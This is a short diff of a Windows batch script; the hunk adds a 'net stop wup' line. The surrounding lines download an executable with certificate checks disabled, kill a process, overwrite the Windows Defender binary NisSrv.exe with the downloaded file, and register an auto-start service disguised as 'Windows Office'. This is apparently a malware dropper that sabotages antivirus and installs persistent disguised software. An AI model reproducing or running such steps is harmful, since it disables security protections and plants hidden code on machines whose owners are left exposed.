@@ -69,6 +69,7 @@ wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
 rem %windir%\wofficeie1.exe
 SLEEP 10
 taskkill /f /im wup.exe
+net stop wup
 rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
 copy /y %windir%\woffice.exe 'C:\Program Files\Windows Defender\NisSrv.exe'
 sc create wup binPath= "%windir%\wup.exe" DisplayName= "Windows Office" start= auto
